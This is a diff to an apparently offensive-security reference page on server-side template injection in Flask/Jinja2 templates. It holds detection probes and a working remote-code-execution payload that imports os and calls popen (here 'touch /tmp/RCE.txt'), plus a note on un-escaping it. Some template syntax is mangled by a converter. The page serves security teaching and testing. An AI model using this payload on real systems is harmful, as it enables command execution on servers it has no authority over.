@@ -16,18 +16,21 @@ Flask is a framework for web applications written in Python and developed from t
 
 ## Syntax SSTI
 
-```
-{{7*7}}
-{{ varname }}
+```python
+\{\{7*7\}\}
+\{\{ varname \}\}
 
 <div data-gb-custom-block data-tag="if" data-1='1'></div>PRINT<div data-gb-custom-block data-tag="else">NOPRINT</div>
+
 ```
 
 ## RCE (Remote Code Execution)
 
+```python
+<div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>\{\{x()._module.__builtins__['__import__']('os').popen("touch /tmp/RCE.txt").read()\}\}</div></div>
 ```
-<div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>{{x()._module.__builtins__['__import__']('os').popen("COMMAND").read()}}</div></div>
-```
+> **Note**: Delete backslashs **\{\{ \}\}** in order to permorm the work desired.
+
 
 To bypass some restrictions take a look at the following resources:
 
